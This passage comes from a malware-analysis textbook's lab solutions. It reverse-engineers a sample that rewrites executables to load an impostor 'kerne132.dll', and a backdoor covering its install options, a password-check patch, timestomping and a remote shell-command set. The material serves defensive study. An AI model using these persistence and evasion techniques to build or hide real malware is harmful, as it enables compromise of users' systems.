- en: 0040119A and ecx, 3
  prefs: []
  type: TYPE_NORMAL
- en: 0040119D rep movsb
  prefs: []
  type: TYPE_NORMAL
- en: At this call to stricmp, the program checks for a string value of kernel32.dll
    at . A few instructions later, we see that the program calls repne scasb at 
  prefs: []
  type: TYPE_NORMAL
- en: and rep movsd at , which are functionally equivalent to the strlen and memcpy
    functions. In order to see which memory address is being written by the memcpy
    call, we need to determine what’s stored in EDI, the register used by the rep
    movsd instruction. EDI is loaded with the value from EBX at , so we need to see
    where EBX is set.
  prefs: []
  type: TYPE_NORMAL
- en: We see that EBX is loaded with the value that we passed to stricmp at .
  prefs: []
  type: TYPE_NORMAL
- en: This means that if the function finds the string kernel32.dll, the code replaces
    it with something. To determine what it replaces that string with, we go to the
    rep movsd instruction and see that the source is at offset dword_403010\.
  prefs: []
  type: TYPE_NORMAL
- en: It doesn’t make sense for a DWORD value to overwrite a string of kernel32.dll,
    but it does make sense for one string value to overwrite another. The following
    listing shows what is stored at dword_403010\.
  prefs: []
  type: TYPE_NORMAL
- en: '00403010 dword_403010 dd 6E72656Bh ; DATA XREF: 00403014 dword_403014 dd 32333165h
    ; DATA XREF: _main+1B9r 00403018 dword_403018 dd 6C6C642Eh ; DATA XREF: _main+1C2r
    0040301C dword_40301C dd 0 ; DATA XREF: _main+1CBr You should recognize that hex
    values beginning with 3, 4, 5, 6, or 7 are ASCII characters. IDA Pro has mislabeled
    our data. If we put the cursor on the same line as dword_403010 and press the
    A key on the keyboard, it will convert the data into the string **kerne132.dll**.'
  prefs: []
  type: TYPE_NORMAL
- en: '**528**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Now we know that the executable searches through the filesystem for every file
    ending in *.exe*, finds a location in that file with the string kernel32.dll,
    and replaces it with **kerne132 *.*** **dll**. From our previous analysis, we
    know that *Lab07-03.dll* will be copied into *C:\Windows\System32* and named ***kerne132.dll***.
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we can conclude that the malware modifies executables so that
    they access ***kerne132.dll*** instead of *kernel32.dll*. This indicates that
    ***kerne132.dll***
  prefs: []
  type: TYPE_NORMAL
- en: is loaded by executables that are modified to load ***kerne132.dll*** instead
    of *kernel32.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we’ve reached the end of the program and should be able to use
    dynamic analysis to fill in the gaps. We can use procmon to confirm that the program
    searches the filesystem for *.exe* files and then opens them.
  prefs: []
  type: TYPE_NORMAL
- en: (Procmon will show the program opening every executable on the system.) **7**
  prefs: []
  type: TYPE_NORMAL
- en: If we select an *.exe* file that has been opened and check the imports directory,
    we confirm that the imports from *kernel32.dll* have been replaced with imports
    from ***kerne132.dll***. This means that every executable on the system will attempt
    to load our malicious DLL—every single one.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we check to see how the program modified *kernel32.dll* and *Lab07-03.dll*.
    We can calculate the MD5 hash of *kernel32.dll* before and after the program runs
    to clearly see that this malware does not modify *kernel32.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: When we open the modified *Lab07-03.dll* (now named ***kerne132.dll***), we
    see that it now has an export section. Opening it in PEview, we see that it exports
    all the functions that *kernel32.dll* exported, and that these are forwarded exports,
    so that the actual functionality is still in *kernel32.dll*. The overall effect
    of this modification is that whenever an *.exe* file is run on this computer,
    it will load the malicious ***kerne132.dll*** and run the code in DLLMain.
  prefs: []
  type: TYPE_NORMAL
- en: Other than that, all functionality will be unchanged, and the code will execute
    as if the program were still calling the original *kernel32.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: We have now analyzed this malware completely. We could create host-and network-based
    signatures based on what we know, or we could write a malware report.
  prefs: []
  type: TYPE_NORMAL
- en: We did gloss over a lot of code in this analysis because it was too complicated,
    but did we miss anything? We did, but nothing of importance to malware analysis.
    All of the code in the main method that accessed *kernel32.dll* and *Lab07-03.dll*
    was parsing the export section of *kernel32.dll* and creating an export section
    in *Lab07-03.dll* that exported the same functions and created forward entries
    to *kernel32.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: The malware needs to scan *kernel32.dll* for all the exports and create forward
    entries for the imposter ***kerne132.dll***, because *kernel32.dll* is different
    on different systems. The tailored version of ***kerne132.dll*** exports exactly
    the same functions as the real *kernel32.dll*. In the function that modified the
  prefs: []
  type: TYPE_NORMAL
- en: '*.exe*, the code found the import directory, so it could modify the import
    to *kernel32.dll* and set the bound import table to zero so that it would not
    be used.'
  prefs: []
  type: TYPE_NORMAL
- en: With careful and time-consuming analysis, we could determine what all of these
    functions do. However, when analyzing malware, time is often of the essence, and
    you should typically focus on what’s important. Try not to worry about the little
    details that won’t affect your analysis.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**529**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 9-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: You can get the program to install itself by providing it with the -in option,
    along with the password. Alternatively, you can patch the binary to skip the password
    verification check.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The command-line options for the program are one of four values and the password.
    The password is the string abcd and is required for all actions except the default
    behavior. The -in option instructs the malware to install itself. The -re option
    instructs the malware to remove itself. The
  prefs: []
  type: TYPE_NORMAL
- en: -c option instructs the malware to update its configuration, including its beacon
    IP address. The -cc option instructs the malware to print its current configuration
    to the console. By default, this malware functions as a backdoor if installed.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: You can patch the binary by changing the first bytes of the function at address
    0x402510 to always return true. The assembly instruction for this behavior is
    MOV EAX, 0x1; RETN;, which corresponds to the byte sequence B8 01 00 00 00 C3\.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware creates the registry key HKLM\Software\Microsoft \XPS\ Configuration
    (note the trailing space after Microsoft). The malware also creates the service
    *XYZ* Manager Service, where *XYZ* can be a parameter provided at install time
    or the name of the malware executable. Finally, when the malware copies itself
    into the Windows System directory, it may change the filename to match the service
    name.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The malware can be instructed to execute one of five commands via the network:
    SLEEP, UPLOAD, DOWNLOAD, CMD, or NOTHING. The SLEEP command instructs the malware
    to perform no action for a given period of time.'
  prefs: []
  type: TYPE_NORMAL
- en: The UPLOAD command reads a file from the network and writes it to the local
    system at a specified path. The DOWNLOAD command instructs the malware to send
    the contents of a local file over the network to the remote host. The CMD command
    causes the malware to execute a shell command on the local system. The NOTHING
    command is a no-op command that causes the malware to do nothing.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: By default, the malware beacons *http://www.practicalmalwareanalysis.com/*;
    however, this is configurable. The beacons are HTTP/1.0 GET requests for resources
    in the form *xxxx/xxxx.xxx*, where *x* is a random alphanumeric ASCII character.
    The malware does not provide any HTTP headers with its requests.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We start by debugging the malware with OllyDbg. We use the F8 key to step-over
    until we arrive at the address 0x403945, which is the call to the main function.
    (The easiest way to figure out that the main function starts at 0x402AF0
  prefs: []
  type: TYPE_NORMAL
- en: '**530**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 113](index-564_1.png)'
  prefs: []
  type: TYPE_IMG
- en: is by using IDA Pro.) Next, we use the F7 key to step-into the call to the main
    function. We continue to step forward using F7 and F8 while noting the behavior
    of the sample. (If you accidentally go too far, you can reset execution to the
    beginning by pressing CTRL-F2.)
  prefs: []
  type: TYPE_NORMAL
- en: First, the malware checks to see if the number of command-line arguments equals
    1 at address 0x402AFD. We have not specified any parameters, so the check succeeds,
    and execution resumes at address 0x401000\. Next, it attempts to open the registry
    key HKLM\SOFTWARE\Microsoft \XPS; however, since the registry key does not exist,
    the function returns zero, so execution calls into the function at 0x402410\.
  prefs: []
  type: TYPE_NORMAL
- en: The function at 0x402410 uses GetModuleFilenameA to get the path of the current
    executable and builds the ASCII string /c del path-to-executable >> NUL. Figure
    9-1L shows an instance of the string in the registers window of OllyDbg. Note
    that the contents of EDX are 0x12E248, but OllyDbg correctly interprets this as
    a pointer to an ASCII string. The malware attempts to delete **9**
  prefs: []
  type: TYPE_NORMAL
- en: itself from the disk by combining the constructed string with program *cmd.exe*
    in a call to ShellExecuteA. Fortunately, we have the file open in OllyDbg, so
    Windows does not allow the file to be deleted. This behavior is consistent with
    what we saw during basic dynamic analysis of the sample in the Chapter 3 labs.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-1L: The malware prepares to delete itself, as seen* *in the string
    pointer to EDX*'
  prefs: []
  type: TYPE_NORMAL
- en: 'Our next task is to coerce the malware to run properly. We have at least two
    options: we can provide more command-line arguments to satisfy the check at address
    0x402AFD, or we can modify the code path that checks for the registry keys. Modifying
    the code path may have unin-tended effects. Later instructions can depend on information
    stored in these keys, and if that information is changed, the malware could fail
    to execute. Let’s try providing more command-line arguments first, to avoid potential
    issues.'
  prefs: []
  type: TYPE_NORMAL
- en: Choose any entry from the strings listing, such as -in, and use it as a command-line
    argument to test whether the malware does something interesting. To do this, choose
    **Debug****Arguments**, as shown in Figure 9-2L.
  prefs: []
  type: TYPE_NORMAL
- en: Then add the -in argument in the OllyDbg arguments dialog, as shown in Figure
    9-3L.
  prefs: []
  type: TYPE_NORMAL
- en: When the malware is executed with the argument -in, it still tries to delete
    itself, which tells us that the command-line arguments are not yet valid. Let’s
    use OllyDbg to step through the code flow when we give the malware a parameter
    to see what’s happening.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**531**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 114](index-565_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 115](index-565_2.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 9-2L: Choosing to debug arguments*'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-3L: Adding the -in argument*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 9-1L shows the function setup and parameter check.
  prefs: []
  type: TYPE_NORMAL
- en: 00402AF0 PUSH EBP
  prefs: []
  type: TYPE_NORMAL
- en: 00402AF1 MOV EBP,ESP
  prefs: []
  type: TYPE_NORMAL
- en: 00402AF3 MOV EAX,182C
  prefs: []
  type: TYPE_NORMAL
- en: 00402AF8 CALL Lab09-01.00402EB0
  prefs: []
  type: TYPE_NORMAL
- en: 00402AFD
  prefs: []
  type: TYPE_NORMAL
- en: CMP DWORD PTR SS:[EBP+8],1
  prefs: []
  type: TYPE_NORMAL
- en: 00402B01 JNZ SHORT Lab09-01.00402B1D
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-1L: Function setup and argc comparison*'
  prefs: []
  type: TYPE_NORMAL
- en: We see that after checking a command-line parameter, execution takes the jump
    at 0x402B01\. argc, the number of string arguments passed to the program, is found
    8 bytes above the frame pointer , since it is the first argument to the main
    function.
  prefs: []
  type: TYPE_NORMAL
- en: 'At 0x402B2E, the last command-line argument is passed into the function that
    starts at address 0x402510\. We know it is the last argument because the main
    function of a standard C program takes two parameters: argc, the number of command-line
    parameters, and argv, an array of pointers to the command-line parameters. EAX
    contains argc, and ECX contains argv, as shown in Listing 9-2L at  and . The
    instruction at  performs pointer **532**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: arithmetic to select the last element in the array of command-line parameters.
    This pointer ends up in EAX, and is pushed onto the top of the stack prior to
    the function call.
  prefs: []
  type: TYPE_NORMAL
- en: 00402B1D MOV EAX,DWORD PTR SS:[EBP+8] ; ARGC
  prefs: []
  type: TYPE_NORMAL
- en: 00402B20 MOV ECX,DWORD PTR SS:[EBP+C] ; ARGV
  prefs: []
  type: TYPE_NORMAL
- en: 00402B23 MOV EDX,DWORD PTR DS:[ECX+EAX*4-4] 
  prefs: []
  type: TYPE_NORMAL
- en: 00402B27 MOV DWORD PTR SS:[EBP-4],EDX
  prefs: []
  type: TYPE_NORMAL
- en: 00402B2A MOV EAX,DWORD PTR SS:[EBP-4]
  prefs: []
  type: TYPE_NORMAL
- en: 00402B2D PUSH EAX
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-2L: Pointer to the last element in argv is pushed on the stack*
    The basic disassembly view provided by OllyDbg gives a rough overview of the function
    that starts at address 0x402510\. There are no function calls, but by scanning
    the instructions, we see the use of the arithmetic operations **9**'
  prefs: []
  type: TYPE_NORMAL
- en: ADD, SUB, MUL, and XOR on byte-sized operands, such as at addresses 0x402532
  prefs: []
  type: TYPE_NORMAL
- en: through 0x402539\. It looks like this routine does a sanity check of the input
    using a convoluted, hard-coded algorithm. Most likely the input is some type of
    password or code.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*If you perform a full analysis of 0x4025120, you can determine that the password*
    *is* abcd *. You will be equally successful using the password or the patch method
    we* *explain next.*'
  prefs: []
  type: TYPE_NORMAL
- en: Rather than reversing the algorithm, we patch the binary so that the password
    check function at 0x402510 will always return the value associated with a successful
    check. This will allow us to continue analyzing the meat of the malware. We note
    that there is an inline function call to strlen at addresses 0x40251B through
    0x402521\. If the argument fails this check, EAX
  prefs: []
  type: TYPE_NORMAL
- en: is zeroed out, and execution resumes at the function cleanup at 0x4025A0\.
  prefs: []
  type: TYPE_NORMAL
- en: Further reversing reveals that only the correct argument will cause the function
    to return the value 1, but we’ll patch it so that it returns 1 in all cases, regardless
    of the argument. To do this, we insert the instructions shown in Listing 9-3L.
  prefs: []
  type: TYPE_NORMAL
- en: B8 01 00 00 00 MOV EAX, 0x1
  prefs: []
  type: TYPE_NORMAL
- en: C3 RET
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-3L: Patch code for the password check*'
  prefs: []
  type: TYPE_NORMAL
- en: 'We assemble these instructions using the **Assemble** option in OllyDbg and
    get the 6-byte sequence: B8 01 00 00 00 C3\. Because the CALL instruction prepares
    the stack, and the RET instruction cleans it up, we can overwrite the instructions
    at the very beginning of the password check function, at address 0x402510\. Edit
    the instructions by right-clicking the start address you wish to edit and selecting
    **Binary****Edit**. Figure 9-4L shows the relevant context menu items.'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**533**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 116](index-567_1.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 117](index-567_2.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 118](index-567_3.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 9-4L: Patching a binary*'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 9-5L shows the assembled instructions after they have been entered into
    the edit dialog. Since we want to write 6 bytes over a previous instruction that
    took only 1 byte, we uncheck the box labeled **Keep size**.
  prefs: []
  type: TYPE_NORMAL
- en: We then enter the assembled hex values in the **HEX+06** field and click **OK**.
  prefs: []
  type: TYPE_NORMAL
- en: OllyDbg will automatically assemble and display the new instructions at the
    appropriate location. Next, save the changes to the executable by right-clicking
    the disassembly window and selecting **Copy to executable****All** **modifications**.
    Accept all dialogs, and save the new version as *Lab09-01-patched.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: To test whether the password check function was successfully disabled, we try
    debugging it with the command-line parameter -in again. This time, the malware
    successfully passes the check at address 0x402510 and jumps to address 0x402B3F.
    Six instructions later, a pointer to the first command-line parameter is pushed
    onto the stack next to a pointer to another ASCII string,
  prefs: []
  type: TYPE_NORMAL
- en: -in. Figure 9-6L shows the state of the stack at this point.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-5L: Inserting new instructions*'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-6L: State of the stack*'
  prefs: []
  type: TYPE_NORMAL
- en: '*at address 0x402B57*'
  prefs: []
  type: TYPE_NORMAL
- en: The function at address 0x40380F is __mbscmp, which is a string-comparison function
    recognized by IDA Pro’s FLIRT signature database. The malware uses __mbscmp to
    check the command-line parameter against a list of supported options that determine
    its behavior.
  prefs: []
  type: TYPE_NORMAL
- en: Next, the malware checks that two command-line parameters were provided. Since
    we have provided only one (-in), the check fails, and the malware attempts to
    delete itself again. We can pass this check by providing an additional command-line
    parameter.
  prefs: []
  type: TYPE_NORMAL
- en: Recall that the last command-line parameter is treated as a password, but since
    we patched the password function, we can provide any string as the password. Set
    a breakpoint at address 0x402B63 so we can quickly return to **534**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 119](index-568_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 120](index-568_2.png)'
  prefs: []
  type: TYPE_IMG
- en: the command-line parameter check, add a junk command-line argument after -in,
    and restart the debugging process. The malware accepts all the command-line parameters
    and performs its intended behavior.
  prefs: []
  type: TYPE_NORMAL
- en: If we continue to debug the malware, we see the malware attempt to open the
    service manager at address 0x4026CC using the same basename as the malware executable.
    The *basename* is the portion of a path with the directory and file extension
    information stripped. If the service does not exist, the malware creates an autostart
    service with a name in the form *basename* Manager Service, and the binary path
    *%SYSTEMROOT%\system32\<filename>* . Figure 9-7L
  prefs: []
  type: TYPE_NORMAL
- en: shows the state of the call stack when CreateServiceA is called and includes
    the ASCII string name, description, and path. At address 0x4028A1, the malware
    copies itself into *%SYSTEMROOT%\ system32\* . The function at address 0x4015B0
    alters the modified, accessed, and changed timestamps of the copy to match those
    of the system file *kernel32.dll*. Modifying timestamps to match another file
    is known as *timestomping*.
  prefs: []
  type: TYPE_NORMAL
- en: '**9**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-7L: Stack state at call to CreateServiceA at address 0x402805*'
  prefs: []
  type: TYPE_NORMAL
- en: Finally, the malware creates the registry key HKLM\SOFTWARE\Microsoft \XPS.
  prefs: []
  type: TYPE_NORMAL
- en: The trailing space after Microsoft makes this a unique host-based indicator.
  prefs: []
  type: TYPE_NORMAL
- en: It fills the value named Configuration with the contents of a buffer pointed
    to by the EDX register at address 0x4011BE. To find out what the contents of that
    buffer were, set a breakpoint at the address 0x4011BE, and run (press F9) to it.
    Right-click the contents of the EDX register in the registers window and select
    **Follow in Dump**. The hex dump view shows four NULL-terminated strings followed
    by many zeros, as shown in Figure 9-8L. The strings contain the values ups, http://www.practicalmalwareanalysis.com,
    80, and 60\. This looks like it may be the configuration data related to a network
    capability of the malware.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-8L: Networking strings seen in memory*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Command-Line Option Analysis**'
  prefs: []
  type: TYPE_NORMAL
- en: With the installation routine of the malware documented, we can now explore
    the other functionality by continuing to debug it with OllyDbg or disassembling
    it with IDA Pro. First, we’ll use IDA Pro to describe other code Solutions to
    Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**535**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: paths. This sample supports the switches -in, -re, -c, and -cc, as shown in
    Table 9-1L. These can be easily identified in the main function by looking for
    calls to __mbscmp.
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 9-1L:** Supported Command-Line Switches'
  prefs: []
  type: TYPE_NORMAL
- en: '**Command-line switch**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Address of implementation**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Behavior**'
  prefs: []
  type: TYPE_NORMAL
- en: -in
  prefs: []
  type: TYPE_NORMAL
- en: '0x402600'
  prefs: []
  type: TYPE_NORMAL
- en: Installs a service
  prefs: []
  type: TYPE_NORMAL
- en: -re
  prefs: []
  type: TYPE_NORMAL
- en: '0x402900'
  prefs: []
  type: TYPE_NORMAL
- en: Uninstalls a service
  prefs: []
  type: TYPE_NORMAL
- en: -c
  prefs: []
  type: TYPE_NORMAL
- en: '0x401070'
  prefs: []
  type: TYPE_NORMAL
- en: Sets a configuration key
  prefs: []
  type: TYPE_NORMAL
- en: -cc
  prefs: []
  type: TYPE_NORMAL
- en: '0x401280'
  prefs: []
  type: TYPE_NORMAL
- en: Prints a configuration key
  prefs: []
  type: TYPE_NORMAL
- en: Compare the function that starts at address 0x402900, which corresponds to the
    command-line parameter -re, with the installation function that we examined earlier.
    The -re function does the exact opposite of the function at 0x402600\. It opens
    the service manager (address 0x402915), locates an installation of the malware
    (address 0x402944), and deletes the service (address 0x402977). Finally, it deletes
    the copy of the malware located in *%SYSTEMROOT%\ system32* and removes the configuration
    registry value (addresses 0x402A9D and 0x402AD5).
  prefs: []
  type: TYPE_NORMAL
- en: Next, look at the function that starts at address 0x401070, which runs if we
    provide the -c switch. If you’ve been diligent in renaming functions with descriptive
    names in IDA Pro, then it will be obvious that we have already encountered this
    function, during both the installation and uninstallation routines. If you’ve
    forgotten to update this function name, use the cross-reference feature of IDA
    Pro to verify that this function is used in all those places. To do this, navigate
    to the function implementation, click the function name, right-click the name,
    and select **Xrefs to**.
  prefs: []
  type: TYPE_NORMAL
- en: The function that starts at 0x401070 takes four parameters, which it concatenates
    together. The string concatenation functions are inline and can be identified
    by the REP MOVSx (REPeat MOVe String) instructions. The function writes the resultant
    buffer to the registry value Configuration of the Windows registry key HKLM\SOFTWARE\Microsoft
    \XPS. Providing the -c switch to the malware allows the user to update the malware
    configuration in the Windows registry. Figure 9-9L shows the entry in the Windows
    registry using Regedit after a default installation of the malware.
  prefs: []
  type: TYPE_NORMAL
- en: The function at 0x401280, which executes if the -cc switch is provided, is the
    reverse of the configure function (0x401070), as it reads the contents of the
    configuration registry value and places the fields into buffers specified as function
    arguments. If the -cc switch is provided to the malware, the current configuration
    is read from the registry and formatted into a string.
  prefs: []
  type: TYPE_NORMAL
- en: 'The malware then prints this string to the console. Here is the output of the
    -cc switch after a default installation of the malware: C:>Lab09-01-patched.exe
    –cc epar'
  prefs: []
  type: TYPE_NORMAL
- en: k:ups h:http://www.practicalmalwareanalysis.com p:80 per:60
  prefs: []
  type: TYPE_NORMAL
- en: '**536**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 121](index-570_1.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 9-9L: Configuration registry value*'
  prefs: []
  type: TYPE_NORMAL
- en: '**9**'
  prefs: []
  type: TYPE_NORMAL
- en: The final code path is reached when the malware is installed and not provided
    with any command-line parameters. The malware checks for installation at address
    0x401000 by determining whether the registry key was created. The implementation
    of the default behavior is found in the function starting at address 0x402360\.
    Note the jump up at 0x402403 and back to 0x40236D, which indicates a loop, and
    that the three exit conditions (at addresses 0x4023B6, 0x4023E0, and 0x402408)
    lead directly to program termination. It looks like the malware gets the current
    configuration, calls a function, sleeps for a second, and then repeats the process
    forever.
  prefs: []
  type: TYPE_NORMAL
- en: '**Backdoor Analysis**'
  prefs: []
  type: TYPE_NORMAL
- en: 'The backdoor functionality is implemented in a chain of functions first called
    from the infinite loop. The function at 0x402020 calls the function starting at
    address 0x401E60, and compares the beginning of the string returned against a
    list of the supported values: SLEEP, UPLOAD, DOWNLOAD, CMD, and NOTHING. If the
    malware encounters one of these strings, it will call a function that responds
    to that request, in a process similar to the parsing of the command-line arguments.
    Table 9-2L summarizes the supported commands, showing the adjustable parameters
    in italics.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 9-2L:** Supported Commands'
  prefs: []
  type: TYPE_NORMAL
- en: '**Address of**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Command-string**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Command**'
  prefs: []
  type: TYPE_NORMAL
- en: '**implementation**'
  prefs: []
  type: TYPE_NORMAL
- en: '**format**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Behavior**'
  prefs: []
  type: TYPE_NORMAL
- en: SLEEP
  prefs: []
  type: TYPE_NORMAL
- en: '0x402076'
  prefs: []
  type: TYPE_NORMAL
- en: SLEEP *secs*
  prefs: []
  type: TYPE_NORMAL
- en: Sleeps for *secs* seconds
  prefs: []
  type: TYPE_NORMAL
- en: UPLOAD
  prefs: []
  type: TYPE_NORMAL
- en: '0x4019E0'
  prefs: []
  type: TYPE_NORMAL
- en: UPLOAD *port*
  prefs: []
  type: TYPE_NORMAL
- en: Creates the file *filename* on the local
  prefs: []
  type: TYPE_NORMAL
- en: '*filename*'
  prefs: []
  type: TYPE_NORMAL
- en: system by first connecting to the remote
  prefs: []
  type: TYPE_NORMAL
- en: host over port *port* and reading the
  prefs: []
  type: TYPE_NORMAL
- en: contents
  prefs: []
  type: TYPE_NORMAL
- en: DOWNLOAD
  prefs: []
  type: TYPE_NORMAL
- en: '0x401870'
  prefs: []
  type: TYPE_NORMAL
- en: DOWNLOAD *port*
  prefs: []
  type: TYPE_NORMAL
- en: Reads the file *filename* and sends it to
  prefs: []
  type: TYPE_NORMAL
- en: '*filename*'
  prefs: []
  type: TYPE_NORMAL
- en: the remote host over port *port*
  prefs: []
  type: TYPE_NORMAL
- en: '*(continued)*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**537**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 9-2L:** Supported Commands (continued) **Address of**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Command-string**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Command**'
  prefs: []
  type: TYPE_NORMAL
- en: '**implementation**'
  prefs: []
  type: TYPE_NORMAL
- en: '**format**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Behavior**'
  prefs: []
  type: TYPE_NORMAL
- en: CMD
  prefs: []
  type: TYPE_NORMAL
- en: '0x402268'
  prefs: []
  type: TYPE_NORMAL
- en: CMD *port*
  prefs: []
  type: TYPE_NORMAL
- en: Executes the shell command *command*
  prefs: []
  type: TYPE_NORMAL
- en: '*command*'
  prefs: []
  type: TYPE_NORMAL
- en: with *cmd.exe* and sends the output to
  prefs: []
  type: TYPE_NORMAL
- en: the remote host over port *port*
  prefs: []
  type: TYPE_NORMAL
- en: NOTHING
  prefs: []
  type: TYPE_NORMAL
- en: '0x402356'
  prefs: []
  type: TYPE_NORMAL
- en: NOTHING
  prefs: []
  type: TYPE_NORMAL
- en: No operation
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*UPLOAD and DOWNLOAD commands are reversed from their standard usage. Always
    focus* *on the underlying functionality for your analysis and not the individual
    strings used* *by the malware.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Networking Analysis**'
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we see that we have a full-featured backdoor on our hands. The
    malware can execute arbitrary shell commands and built-in routines for file upload
    and download. Next, we’ll explore the function that starts at address 0x401E60
    and returns the command to the behavior dispatcher. This will show how a command
    is communicated to the malware from the remote host, which may enable us to create
    network-based signatures for this sample.
  prefs: []
  type: TYPE_NORMAL
- en: While browsing the contents of 0x401E60, we see quite a few calls to functions
    with only one cross-reference. Rather than fully reverse each function, we debug
    this code path using OllyDbg. Before doing this, ensure that the malware has been
    successfully installed by running the malware with the
  prefs: []
  type: TYPE_NORMAL
- en: -cc option, which should print out the current configuration if the program
    is installed, or attempt to delete itself if it is not.
  prefs: []
  type: TYPE_NORMAL
- en: Next, open the malware with OllyDbg and delete any saved command-line parameters
    so that the malware will perform its default behavior. Set a breakpoint at address
    0x401E60\. You can easily navigate to this address by pressing CTRL-G and entering
    **401E60**. Set the breakpoint at that location by pressing F2\.
  prefs: []
  type: TYPE_NORMAL
- en: Run through this region a few times using **Step Over** (press F8). Pay particular
    attention to the function arguments and return values.
  prefs: []
  type: TYPE_NORMAL
- en: First, we’ll examine the function that starts at 0x401420\. We set a breakpoint
    at the call at address 0x401E85 and at the instruction immediately after it (0x401E8A).
    At the first breakpoint, two parameters have been pushed onto the stack. On the
    top of the stack, we see the address 0x12BAAC, followed by the integer 0x400\.
    If we follow the address in the dump view, we see that it contains a large chunk
    of zeros—probably at least 0x400 bytes of free space. Next, run the malware (press
    F9) to the second breakpoint. In the function that starts at address 0x401420,
    the malware writes the ASCII string http://www.practicalmalwareanalysis.com into
    the buffer. We can now (correctly) hypothesize that this function gets a particular
    configuration value from the Windows registry, which was initialized during installation,
